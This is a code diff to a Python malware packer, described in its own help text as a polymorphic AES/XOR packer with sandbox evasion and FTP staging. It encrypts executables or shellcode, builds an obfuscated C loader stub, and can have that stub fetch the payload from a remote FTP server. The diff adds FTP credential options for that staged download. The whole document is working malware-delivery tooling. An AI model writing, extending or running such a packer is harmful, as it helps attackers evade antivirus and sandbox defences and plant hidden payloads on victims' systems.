@@ -13,14 +13,14 @@ def xor_encrypt(data, key):
 
 def aes_encrypt(data, key):
     key_bytes = key.encode()
-    key_bytes = key_bytes.ljust(16, b'\0')[:16]  # Ensure 128-bit key
+    key_bytes = key_bytes.ljust(16, b'\0')[:16]
     cipher = AES.new(key_bytes, AES.MODE_CBC, iv=b'\0'*16)
     return cipher.encrypt(pad(data, 16))
 
 def random_identifier(length=8):
     return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
-def generate_stub(payload_bytes, key, enc_algo, payload_type, url=None, embed_payload=True):
+def generate_stub(payload_bytes, key, enc_algo, payload_type, url=None, embed_payload=True, ftp_user="anonymous", ftp_pass=""):
     if embed_payload:
         payload_array = ','.join(f'0x{b:02x}' for b in payload_bytes)
         payload_len = len(payload_bytes)
@@ -57,6 +57,8 @@ int {junk_func}() {{
     stub_code = stub_code.replace("{{KEY}}", f'"{key}"')
     stub_code = stub_code.replace("{{ENC_ALGO}}", f'"{enc_algo}"')
     stub_code = stub_code.replace("{{PAYLOAD_TYPE}}", f'"{payload_type}"')
+    stub_code = stub_code.replace("{{FTP_USER}}", ftp_user)
+    stub_code = stub_code.replace("{{FTP_PASS}}", ftp_pass)
 
     if url:
         parsed_url = urlparse(url)
@@ -89,7 +91,7 @@ def compile_stub(output_name):
     subprocess.run(cmd, check=True)
 
 def main():
-    parser = argparse.ArgumentParser(description="Polymorphic hardened AES/XOR packer with sandbox evasion and FTP staging")
+    parser = argparse.ArgumentParser(description="Polymorphic hardened AES/XOR packer with sandbox evasion and FTP staging + auth")
     parser.add_argument("-i", "--input", required=True, help="Input file (exe or shellcode)")
     parser.add_argument("-o", "--output", required=True, help="Output packed executable")
     parser.add_argument("-t", "--type", required=True, choices=["shellcode", "exe"], help="Payload type")
@@ -97,6 +99,8 @@ def main():
     parser.add_argument("-k", "--key", required=True, help="Encryption key")
     parser.add_argument("--url", help="Optional remote URL for staged payload (ftp:// preferred)")
     parser.add_argument("--bin", help="Output file for external payload (default payload.bin if --url used)")
+    parser.add_argument("--ftp-user", default="anonymous", help="FTP username")
+    parser.add_argument("--ftp-pass", default="", help="FTP password")
     args = parser.parse_args()
 
     with open(args.input, "rb") as f:
@@ -112,9 +116,9 @@ def main():
         with open(bin_output, "wb") as f:
             f.write(encrypted)
         print(f"[+] External encrypted payload written to {bin_output}")
-        generate_stub(encrypted, args.key, args.encrypt, args.type, url=args.url, embed_payload=False)
+        generate_stub(encrypted, args.key, args.encrypt, args.type, url=args.url, embed_payload=False, ftp_user=args.ftp_user, ftp_pass=args.ftp_pass)
     else:
-        generate_stub(encrypted, args.key, args.encrypt, args.type, embed_payload=True)
+        generate_stub(encrypted, args.key, args.encrypt, args.type, embed_payload=True, ftp_user=args.ftp_user, ftp_pass=args.ftp_pass)
 
     compile_stub(args.output)
     print(f"[+] Packed stub compiled to {args.output}")
